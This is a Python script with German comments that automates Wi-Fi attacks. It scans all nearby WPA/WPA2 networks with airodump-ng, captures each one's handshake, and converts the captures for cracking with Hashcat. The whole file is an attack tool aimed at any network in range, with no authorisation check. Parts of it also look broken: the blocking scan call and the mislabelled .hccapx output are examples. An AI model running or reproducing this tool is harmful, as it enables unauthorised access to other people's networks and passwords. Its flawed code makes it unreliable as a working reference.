import os
import subprocess
import time
import glob

INTERFACE = "wlan1"
HANDSHAKE_DIR = "/home/pi/handshakes"
SCAN_TIME = 30  # Gesamte Scandauer für alle Netzwerke in Sekunden
HANDSHAKE_WAIT_TIME = 20  # Zeit, um auf Handshake pro Netzwerk zu warten

def setup():
    os.makedirs(HANDSHAKE_DIR, exist_ok=True)

def scan_networks():
    print("[*] Starte Netzwerkscan...")
    scan_output = subprocess.check_output(
        ["sudo", "airodump-ng", "--band", "abg", "-w", HANDSHAKE_DIR + "/scan", "--output-format", "csv", INTERFACE],
        stderr=subprocess.DEVNULL
    )
    time.sleep(SCAN_TIME)
    subprocess.call(["sudo", "pkill", "-f", "airodump-ng"])
    return HANDSHAKE_DIR + "/scan-01.csv"

def parse_networks(scan_file):
    networks = []
    with open(scan_file, "r") as f:
        for line in f:
            if "WPA" in line and "WPA2" in line:
                fields = line.split(',')
                if len(fields) > 1:
                    bssid = fields[0].strip()
                    channel = fields[3].strip()
                    networks.append((bssid, channel))
    print(f"[*] {len(networks)} Netzwerke gefunden.")
    return networks

def capture_handshake(bssid, channel):
    print(f"[*] Erfasse Handshake für {bssid} auf Kanal {channel}...")
    # Starte airodump-ng für das spezifische Netzwerk und wartet auf Handshake
    airodump_cmd = [
        "sudo", "airodump-ng", "-c", channel, "--bssid", bssid, "-w",
        f"{HANDSHAKE_DIR}/{bssid}", INTERFACE
    ]
    airodump_process = subprocess.Popen(airodump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(HANDSHAKE_WAIT_TIME)  # Warte auf Handshake

    # Stoppe den airodump-ng Prozess
    airodump_process.terminate()
    airodump_process.wait()

def convert_to_hccapx():
    print("[*] Konvertiere Handshake-Dateien in das .hccapx-Format...")
    cap_files = glob.glob(f"{HANDSHAKE_DIR}/*.cap")
    for cap_file in cap_files:
        hccapx_file = cap_file.replace(".cap", ".hccapx")
        conversion_cmd = ["hcxpcapngtool", "-o", hccapx_file, cap_file]
        subprocess.call(conversion_cmd)
        print(f"[*] {cap_file} wurde in {hccapx_file} umgewandelt.")

def main():
    setup()
    scan_file = scan_networks()
    networks = parse_networks(scan_file)
    for bssid, channel in networks:
        capture_handshake(bssid, channel)
    convert_to_hccapx()
    print(f"[*] Alle Handshakes und konvertierten Dateien sind in {HANDSHAKE_DIR} gespeichert und bereit für Hashcat.")

if __name__ == "__main__":
    main()
